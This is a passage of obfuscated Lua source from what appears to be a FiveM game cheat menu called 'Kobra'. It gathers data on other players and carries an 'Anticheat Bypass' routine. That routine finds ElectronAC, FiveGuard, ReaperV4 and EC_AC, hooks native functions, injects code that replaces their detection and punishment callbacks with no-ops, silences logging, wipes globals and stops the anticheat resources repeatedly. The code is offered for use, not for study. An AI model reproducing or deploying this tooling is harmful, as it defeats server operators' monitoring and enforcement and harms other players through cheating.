0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v655)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v655)))~=(0 + 0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v655))) , -1)==GetPlayerPed(GetPlayerFromServerId(v655))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v655)))))   .. ".0m" },{key="Server ID",value=v655},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v655))),color="0, 255, 17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v655))),color="0, 132, 255"},{key="Weapon",value=v28[v836] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v655)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v655)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v655))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v655))) * (207.6 -(144 + 60)) )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v655))) and "Visible") or "Invisible" }},onSelect=function(v875) v27[v655]=v875 or false ;end};end end end for v497,v498 in pairs(v27) do local v499=0 -0 ;local v500;while true do if (v499==(0 + 0)) then v500=false;for v838,v839 in ipairs(v317) do if (tonumber(v839.serverId)==tonumber(v497)) then v500=true;break;end end v499=4 -3 ;end if (v499==1) then if  not v500 then v27[v497]=nil;end break;end end end v15=math.min(v15 or (1 + 0) ,math.max(1923 -(523 + 1399) , #v315.tabs));local v319,v320=pcall(function() v314:UpdateElements(v17);end);if  not v319 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v320) );end end;v12.AssignListMenuActions=function(v321) local v322=0 + 0 ;while true do if (0==v322) then if  not v16 then return;end for v728,v729 in ipairs(v16) do if ((v729.label=="Server") and v729.categories) then for v945,v946 in ipairs(v729.categories) do if ((v946.label=="List") and v946.tabs) then for v1161,v1162 in ipairs(v946.tabs) do if (v1162.type=="button") then if (v1162.label=="Select Everyone") then v1162.onSelect=function() v12:SelectEveryone();end;elseif (v1162.label=="Un-Select Everyone") then v1162.onSelect=function() v12:UnselectEveryone();end;elseif (v1162.label=="Clear Selection") then v1162.onSelect=function() v12:ClearSelection();end;end end end end end end end break;end end end;CreateThread(function() while true do local v501=404 -(72 + 332) ;while true do if (v501==(976 -(269 + 707))) then Wait(2973 -1473 );if (v12:InListMenu() and v13) then local v878=0 -0 ;local v879;local v880;while true do if (v878==(130 -(123 + 7))) then v879,v880=pcall(function() v12:UpdateListMenu();end);if  not v879 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v880) );end break;end end end break;end end end end);Wait(1000);v12:AssignListMenuActions();local v113=nil;local v114=nil;local function v115() for v502=0 + 0 ,GetNumResources() -(1 + 0)  do local v503=0 -0 ;local v504;local v505;while true do if (v503==(2 -1)) then if (v505 and (string.find(v505,"https://electron-services.com") or string.find(v505,"Electron Services") or string.find(v505,"The most advanced fiveM anticheat"))) then v113=v504;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v504 );return v504;end break;end if (v503==(1088 -(38 + 1050))) then v504=GetResourceByFindIndex(v502);v505=LoadResourceFile(v504,"fxmanifest.lua");v503=1;end end end return nil;end local function v116() local v323=0 + 0 ;while true do if (v323==(0 + 0)) then for v730=0,GetNumResources() -1  do local v731=0;local v732;local v733;while true do if (v731==1) then for v1008=0 + 0 ,v733-(824 -(426 + 397))  do local v1009=1406 -(751 + 655) ;local v1010;while true do if (v1009==(0 -0)) then v1010=GetResourceMetadata(v732,"client_script",v1008);if (v1010 and string.find(v1010,"obfuscated")) then local v1374=0;while true do if (v1374==(1 + 0)) then return v732;end if (v1374==(1245 -(39 + 1206))) then v114=v732;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v732 );v1374=2 -1 ;end end end break;end end end break;end if (v731==(841 -(566 + 275))) then v732=GetResourceByFindIndex(v730);v733=GetNumResourceMetadata(v732,"client_script");v731=1;end end end return nil;end end end v12.LoadBypass=function(v324) local v325={"216.146.24.88:30120","91.190.154.74:30120"};local v326=GetCurrentServerEndpoint();for v506,v507 in ipairs(v325) do if (v326==v507) then local v656=0;while true do if (v656==(0 + 0)) then v324:Notify("error","Kobra","Bypass disabled for this server.",3000);return;end end end end v324:Notify("info","Kobra","Loading Anticheat Bypass...",4707 -1707 );v115();v116();Wait(1000);if (GetResourceState("ReaperV4")=="started") then local v567=0 + 0 ;while true do if (v567==(2 + 0)) then MachoHookNative(15349248000000000000,function(...) return false,0 -0 ;end);MachoHookNative(18127728000000000000 -(8 + 7) ,function(...) return false,true;end);v567=3;end if ((1686 -(1510 + 173))==v567) then print("ReaperV4 Bypass Enabled");v324:Notify("info","Kobra","ReaperV4 Bypass Loaded",3000);break;end if (v567==(1 -0)) then MachoHookNative(10181871000000000000,function(...) return false,1 + 2 ;end);MachoHookNative(12777102000000000000 -(30 + 223) ,function(...) return false,true;end);v567=1258 -(300 + 956) ;end if ((122 -(22 + 100))==v567) then MachoInjectResource2(2,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000 -0 ,function(...) return false,false;end);v567=283 -(47 + 235) ;end end elseif (v113~=nil) then local v734=0;while true do if (v734==0) then v48("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(6 -4 ,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);break;end end elseif (v114~=nil) then local v881=0 + 0 ;while true do if (v881==(486 -(21 + 465))) then CreateThread(function() while true do local v1241=0 + 0 ;while true do if (v1241==(0 + 0)) then MachoResourceStop(v114);print("^7[^5Kobra^7]: Stopped Resource: "   .. v114 );v1241=1;end if (v1241==1) then Wait(2000);break;end end end end);return;end end elseif (GetResourceState("EC_AC")=="started") then local v1011=0 + 0 ;local v1012;while true do if (v1011==(1 -0)) then v1012={"EC_AC"};for v1313=1218 -(553 + 664) , #v1012 do local v1314=v1012[v1313];MachoInjectResource(v1314,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(424 + 626 );end v1011=80 -(73 + 5) ;end if ((1715 -(1128 + 587))==v1011) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);v1011=3 -2 ;end if (v1011==(692 -(558 + 132))) then CreateThread(function() while true do local v1375=0 -0 ;while true do if (v1375==(0 -0)) then Wait(0 + 0 );MachoResourceStop("EC_AC");break;end end end end);break;end end end if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",2358 + 642 );elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",1315 + 1685 );elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",2558 + 442 );elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",3000);end end;
